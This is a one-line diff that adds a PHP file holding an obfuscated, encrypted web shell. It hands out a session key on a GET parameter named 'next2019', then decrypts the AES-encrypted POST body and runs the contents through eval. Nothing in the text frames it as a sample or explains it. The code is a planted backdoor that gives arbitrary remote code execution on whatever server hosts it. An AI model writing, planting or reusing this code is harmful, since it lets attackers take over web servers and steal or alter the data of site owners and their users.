@@ -1,0 +1,1 @@
+<?php class C{public function __invoke($p) {eval($p."");}};session_start();isset($_GET['next2019'])?print $_SESSION['k']=substr(md5(uniqid(rand())),16):($b=explode('|',openssl_decrypt(file_get_contents("php://input"), "AES128", $_SESSION['k'])))&@call_user_func(new C(),$b[1]);?>
